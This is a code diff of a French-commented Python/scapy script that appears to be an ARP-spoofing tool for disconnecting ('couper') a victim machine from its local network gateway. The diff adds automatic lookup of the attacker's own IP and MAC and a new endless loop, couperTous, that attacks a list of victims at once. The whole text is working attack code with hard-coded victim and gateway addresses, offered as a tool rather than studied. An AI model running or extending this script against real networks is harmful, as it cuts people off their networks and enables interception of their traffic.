@@ -1,18 +1,44 @@
 #!/usr/bin/python
 # coding: utf-8
-
 from scapy.all import *
-
+import netifaces
 def main():
 	#Solution provisoire en attendant 
-	#Apres on prendre les donnees de l'utilisateur
-	attaquantIP="192.168.0.106"
-	attaquantMAC="64:76:BA:9E:67:26"
+	#Apres on va prendre les donnees de l'utilisateur
+
+	#Récupération de l'adresse IP et MAC de l'attaquant 
+	ok = True
+	for interface in netifaces.interfaces():
+		if(str(interface) == 'lo0' or str(interface) == 'lo'):
+			pass
+		else:
+			try:
+				attaquantIP = netifaces.ifaddresses(interface)[2][0]['addr']
+				attaquantMAC = netifaces.ifaddresses(interface)[netifaces.AF_LINK][0]['addr']
+			except:
+				ok = False
+				pass
+
+	#Autre manière qui fonctionne de récupérer son addresse IP 
+	#hostname = socket.gethostname()
+	#attaquantIP = socket.gethostbyname(hostname)
+
+
 	victimeIP="192.168.0.100"
 	victimeMAC="24:0A:64:63:BF:65"
 	gatewayIP="192.168.0.1"
 	gatewayMAC="AC:F1:DF:64:30:FC"
 	couperVictime(victimeIP, victimeMAC, gatewayIP, gatewayMAC)
+
+#À tester
+#Gérer des threads ? 
+#Attention à pas couper la gateway
+def couperTous(tabMACIPVictime, tabMACIPGateway):
+	while True:
+		for i in range(len(tabMACIPVictime)):
+			macV, ipV = tabMACIPVictime[i]
+			macG, ipG = tabMACIPGateway[i]
+			couperVictime(ipV, macV, ipG, macG)
 
 
 def couperVictime(victimeIP, victimeMAC, gatewayIP, gatewayMAC):
